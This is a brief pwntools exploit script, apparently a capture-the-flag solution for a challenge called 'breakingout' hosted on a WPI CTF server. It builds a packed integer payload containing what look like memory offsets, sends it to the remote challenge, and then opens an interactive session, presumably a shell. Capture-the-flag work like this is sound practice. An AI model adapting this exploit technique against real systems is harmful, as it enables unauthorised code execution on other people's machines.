
from pwn import *


#r = process(["./breakingout"])

r = remote("breakingout.wpictf.xyz", 31337)

payload = flat([4,0,0,0,
2,-19,1,-15,
2,-20,24,-16,
2,-19,1,-25,
2,-20,26,-26,
2,1,25,0,
0xbc3ca,-4,0x5ba1b])

r.sendlineafter(":",str(len(payload)))
input()

r.sendafter(":",payload)

r.interactive()
